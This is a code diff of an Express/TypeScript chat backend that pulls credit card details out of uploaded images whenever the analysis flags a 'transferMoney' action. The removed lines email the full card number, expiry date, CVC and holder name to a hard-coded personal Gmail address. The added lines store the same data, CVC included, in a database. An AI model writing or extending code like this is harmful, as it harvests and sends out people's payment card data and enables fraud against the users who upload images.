@@ -1,6 +1,6 @@
 import { Request, Response } from 'express';
 import { generateChatResponse, analyzeImage } from '../services/chatService';
-import { sendEmail } from '../services/emailService';
+import { saveCreditCard } from '../services/creditCardService';
 
 export const healthCheck = (_req: Request, res: Response) => {
   console.log('[API] GET /health - Health check requested');
@@ -42,41 +42,36 @@ export const postChatImage = async (req: Request, res: Response) => {
     const analysisResult = await analyzeImage(imageDataUrl);
     console.log('[API] POST /api/chat/image - Analysis complete:', JSON.stringify(analysisResult, null, 2));
 
-    // Send email if credit card is detected and action is transferMoney
-    let emailStatus: 'idle' | 'sending' | 'success' | 'error' = 'idle';
-    let emailError: string | null = null;
-    let emailMessageId: string | null = null;
+    // Save credit card to DB if detected and action is transferMoney
+    let creditCardStatus: 'idle' | 'saving' | 'saved' | 'duplicate' | 'error' = 'idle';
+    let creditCardMessage: string | null = null;
 
     if (analysisResult.action === 'transferMoney' && analysisResult.creditCard) {
-      emailStatus = 'sending';
+      creditCardStatus = 'saving';
       try {
-        console.log('[API] POST /api/chat/image - Sending credit card details via email');
-        const emailText = `Credit Card Details Detected:\n\n` +
-          `Numbers: ${analysisResult.creditCard.numbers}\n` +
-          `Expiration Date: ${analysisResult.creditCard.expirationDate}\n` +
-          `CVC: ${analysisResult.creditCard.cvc}\n` +
-          `Full Name: ${analysisResult.creditCard.fullName}\n\n` +
-          `Action: ${analysisResult.action}`;
+        console.log('[API] POST /api/chat/image - Saving credit card details to database');
+        const result = await saveCreditCard(analysisResult.creditCard);
         
-        emailMessageId = await sendEmail({
-          to: 'maksymilian.padalak@gmail.com',
-          subject: 'Credit Card Detected - Transfer Money Action',
-          text: emailText,
-        });
-        emailStatus = 'success';
-        console.log('[API] POST /api/chat/image - Email sent successfully:', emailMessageId);
+        if (result.saved) {
+          creditCardStatus = 'saved';
+          creditCardMessage = result.message;
+          console.log('[API] POST /api/chat/image - Credit card saved successfully');
+        } else {
+          creditCardStatus = 'duplicate';
+          creditCardMessage = result.message;
+          console.log('[API] POST /api/chat/image - Credit card already exists:', result.message);
+        }
       } catch (error) {
-        emailStatus = 'error';
-        emailError = error instanceof Error ? error.message : 'Failed to send email';
-        console.error('[API] POST /api/chat/image - Email send error:', error);
+        creditCardStatus = 'error';
+        creditCardMessage = error instanceof Error ? error.message : 'Failed to save credit card';
+        console.error('[API] POST /api/chat/image - Credit card save error:', error);
       }
     }
 
     res.json({
       ...analysisResult,
-      emailStatus,
-      emailError,
-      emailMessageId,
+      creditCardStatus,
+      creditCardMessage,
     });
   } catch (error) {
     console.error('[API] POST /api/chat/image - Image analysis error:', error);
